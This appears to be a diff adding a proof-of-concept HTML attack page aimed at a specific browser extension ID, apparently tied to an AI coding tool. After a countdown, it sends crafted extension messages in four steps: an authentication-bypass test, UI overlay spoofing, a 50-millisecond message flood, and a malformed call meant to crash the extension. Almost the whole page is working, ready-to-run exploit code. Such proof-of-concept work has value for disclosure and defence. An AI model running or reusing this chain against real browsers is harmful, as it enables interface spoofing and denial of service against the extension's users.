@@ -1,0 +1,110 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Antigravity Automated Attack (Delayed)</title>
+</head>
+
+<body>
+
+<input type="hidden" id="extId" value="eeijfnjmjelapkebgockoeaadonbchdd">
+
+<h2>Attack will start in <span id="countdown">10</span> seconds</h2>
+
+<hr>
+
+<div id="attackLog">
+    Waiting for timer...
+</div>
+
+<script>
+/* ---------------- TIMER ---------------- */
+let remaining = 10;
+const countdownEl = document.getElementById("countdown");
+
+const countdownTimer = setInterval(() => {
+    remaining--;
+    countdownEl.innerText = remaining;
+
+    if (remaining === 0) {
+        clearInterval(countdownTimer);
+        countdownEl.innerText = "0";
+        startAttack();
+    }
+}, 1000);
+
+/* ---------------- CORE LOGIC ---------------- */
+const getExtId = () => document.getElementById("extId").value;
+
+const attackLog = (msg) => {
+    const el = document.getElementById("attackLog");
+    el.innerHTML += `[Log] ${msg}<br>`;
+};
+
+const sleep = ms => new Promise(r => setTimeout(r, ms));
+
+async function startAttack() {
+    const extId = getExtId();
+    attackLog("Timer expired");
+
+    // STEP 1: AUTH BYPASS
+    attackLog("Step 1: Testing Auth Bypass...");
+    try {
+        chrome.runtime.sendMessage(extId, {
+            action: "rpcCall",
+            method: "smartFocusConversation",
+            params: { L: "PING" }
+        }, r => {
+            attackLog("Reply: " + (r ? JSON.stringify(r) : "No reply"));
+        });
+    } catch (e) {
+        attackLog("Error during Step 1");
+    }
+    await sleep(2000);
+
+    // STEP 2: UI SPOOF
+    attackLog("Step 2: Triggering UI manipulation...");
+    try {
+        chrome.runtime.sendMessage(extId, {
+            action: "rpcCall",
+            method: "validateCascadeOrCancelOverlay",
+            params: { L: "ATTACK" }
+        });
+    } catch (e) {
+        attackLog("Error during Step 2");
+    }
+    await sleep(2000);
+
+    // STEP 3: FOCUS FLOOD
+    attackLog("Step 3: Focus flood (5s)...");
+    let flood = setInterval(() => {
+        chrome.runtime.sendMessage(extId, {
+            action: "rpcCall",
+            method: "smartFocusConversation",
+            params: { L: "FLOOD" }
+        });
+    }, 50);
+
+    await sleep(5000);
+    clearInterval(flood);
+    attackLog("Flood stopped.");
+
+    // STEP 4: DoS / CRASH
+    attackLog("Step 4: Executing DoS crash...");
+    try {
+        chrome.runtime.sendMessage(extId, {
+            action: "rpcCall",
+            method: "smartFocusConversation"
+            // missing params → crash path
+        });
+    } catch (e) {
+        attackLog("Error during Step 4");
+    }
+
+    attackLog("Attack chain completed.");
+}
+</script>
+
+</body>
+</html>
